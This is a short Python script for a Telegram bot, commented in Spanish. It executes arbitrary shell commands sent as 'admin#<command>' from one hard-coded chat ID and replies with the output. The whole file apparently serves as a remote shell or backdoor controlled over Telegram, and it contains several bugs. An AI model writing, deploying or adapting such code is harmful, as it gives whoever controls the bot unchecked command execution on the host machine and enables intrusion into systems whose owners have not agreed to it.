from telegram.ext import * 
import subprocess
import os
API_KEY = 'API' # IMPORTANTE, LA API DEBE SER LA DEL BOT.
CURR_DIR = os.path.dirname(os.path.realpath(__file__))
print(CURR_DIR)
def ejecutar(comando):
    #output = subprocess.call(comando, shell=True)
    comando = "cd " + CURR_DIR + " | " + comando
    result = subprocess.check_output(comando, shell=True)
    return result

def sample_responses(input_text):
    user_message = str(input_text).lower().split('#')

    if user_message[0] == ("admin"):
        return ejecutar(user_message[1])   #   broadcast

    if user_message[0] == ("broadcast"):
        return "Estoy operativo! me encuentro en: " + CURR_DIR
    if user_message[0] == ("no auth"):
        return "No recibiré tus ordenes  😎🥵👊"
    return "Error en la sentencia."


def handle_message(update, context):
    
    userid = str(update.message.chat.id).lower()
    if userid == '1094383694':
        print("el admin 🥵")
        text = str(update.message.text).lower()
        response = str(sample_responses(text))
        update.message.reply_text(response)
    else:
        sample_responses("no auth")
def error(update, context):
    userid = str(update.message.chat.id).lower()
    if userid == 1094383694:
        sample_responses()
    else:
        sample_responses("no auth")
def main():
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(MessageHandler(Filters.text, handle_message))
    dp.add_error_handler(error)
    updater.start_polling()
    updater.idle()
main()
